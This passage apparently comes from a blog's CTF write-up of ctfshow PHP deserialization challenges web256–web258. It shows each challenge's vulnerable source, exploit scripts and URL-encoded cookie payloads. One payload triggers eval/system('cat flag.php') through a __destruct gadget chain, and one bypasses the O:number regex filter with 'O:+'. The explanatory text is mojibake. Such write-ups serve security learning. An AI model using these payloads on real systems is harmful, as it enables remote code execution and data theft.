title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!==<span class="hljs-variable language_">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;yn8rt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>å¢åŠ äº†ä¸€ä¸ªæ¡ä»¶ï¼Œè®©username!&#x3D;passwordå°±è¡Œ</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?username<span class="hljs-operator">=</span>yn<span class="hljs-number">8</span>rt&amp;password<span class="hljs-operator">=</span>xxxxxx<br>Cookie:user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>username<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>yn<span class="hljs-number">8</span>rt<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;</span><br><span class="language-php">    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);</span><br><span class="language-php">    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼Œé­”æ³•å‡½æ•°_constructå½“å¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œå¯¹å¯¹è±¡è¿›è¡Œåˆå§‹åŒ–ï¼Œå½“æ‰€æœ‰çš„æ“ä½œæ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œéœ€è¦é‡Šæ”¾åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè§¦å‘_destruct()é­”æœ¯æ–¹æ³•</p><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨æ‰§è¡Œ_construct()çš„æ—¶å€™åˆå§‹åŒ–backDoorç±»ï¼Œæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„åˆ©ç”¨ï¼Œä¹‹åååºåˆ—åŒ–ç»“æŸåï¼Œä¼šæ‰§è¡Œ_destruct(),æ­¤æ—¶eval($this-&gt;code);ç­‰ä»·äºeval(system(â€˜cat flag.phpâ€™);)</p><p>å› æ­¤ä¸ºäº†å®ç°è¿™ä¸ªç›®çš„é¦–å…ˆå»æ‰æˆ‘ä»¬ä¸éœ€è¦çš„infoç±»ï¼Œä¸‹é¢<br>æ„é€ popé“¾(ç”±äºé…ä¸Šprivateæœ‰ç‰¹æ®Šä¸å¯è§å­—ç¬¦ä¸æƒ³æ‰‹åŠ¨å¤„ç†æ‰€ä»¥è¿›è¡Œurlç¼–ç )</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>()));</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=xxxxxx&amp;password=xxxxxx<br><span class="hljs-attribute">Cookie</span>:user=O%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ctfShowUser%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A21%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A21%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>isVip%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>class%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>backDoor%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>backDoor%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A23%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>cat+flag.php%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> ctfShowUser&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> function __construct()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">class</span>=new info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> function login(<span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> function __destruct()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">class</span>-&gt;getInfo();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> info&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> function getInfo()&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> backDoor&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> function getInfo()&#123;<br>        eval(<span class="hljs-variable">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$username</span>) &amp;&amp; isset(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¤šäº†ä¸€ä¸ªæ­£åˆ™åŒ¹é…<br><code>if(!preg_match(&#39;/[oc]:\d+:/i&#39;, $_COOKIE[&#39;user&#39;]))</code><br>æ„æ€ä¸ºè¿‡æ»¤<strong>Oï¼šæ•°å­—</strong><br>è¿™ç§æƒ…å†µå¯ç”¨+ç»•è¿‡ï¼Œå¦‚ï¼šO:+</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span 